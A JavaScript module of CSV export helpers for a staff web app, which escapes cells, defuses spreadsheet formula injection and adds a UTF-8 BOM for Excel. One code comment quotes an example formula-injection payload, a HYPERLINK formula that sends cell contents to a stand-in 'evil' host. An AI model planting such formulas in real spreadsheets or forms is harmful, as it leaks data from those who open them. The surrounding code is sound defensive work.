/* ============================================================
   csv.js — dependency-free CSV helpers for the Staff Hub
   ============================================================ */

// Escape a single CSV cell value. Coerces null/undefined to "".
// Wraps in double quotes (doubling any internal quotes) when the value
// contains a comma, double-quote, or newline.
//
// Also defuses spreadsheet formula injection. Excel, Numbers and Sheets EXECUTE a
// cell beginning = + - @ (or a leading tab/CR, which they strip first). Our exports
// carry free text staff typed — a review answer, a leave note, a student comment — so
// someone could write =HYPERLINK("http://evil/?c="&A1,"Click me") into a form and have
// it run on the admin's machine when they open the export. Prefixing with an
// apostrophe is the standard defusal: the cell is treated as text, and the apostrophe
// is not shown by the spreadsheet. The value is unchanged everywhere else in the app.
const RISKY_START = /^[=+\-@\t\r]/;
function escapeCell(value) {
  if (value === null || value === undefined) return "";
  let str = String(value);
  if (RISKY_START.test(str)) str = `'${str}`;
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

// Build a CSV string from columns ({ key, label }) and rows (array of objects).
// Header row uses the column labels; each data row pulls values by column key.
export function toCSV(columns, rows) {
  const cols = columns || [];
  const data = rows || [];
  const header = cols.map(c => escapeCell(c.label)).join(",");
  const body = data.map(row => cols.map(c => escapeCell(row[c.key])).join(","));
  return [header, ...body].join("\r\n");
}

// Build the CSV and trigger a browser download via a temporary <a download>.
export function downloadCSV(filename, columns, rows) {
  const csv = toCSV(columns, rows);
  // ﻿ — a UTF-8 byte-order mark. Excel on Windows opens a BOM-less .csv as ANSI,
  // so every non-ASCII character mojibakes: the em dash in "Section 1 — Review
  // Information" becomes "â€"", and so does every accented name. The BOM tells Excel
  // the file is UTF-8. Other tools ignore it.
  const blob = new Blob(["﻿" + csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename || "export.csv";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
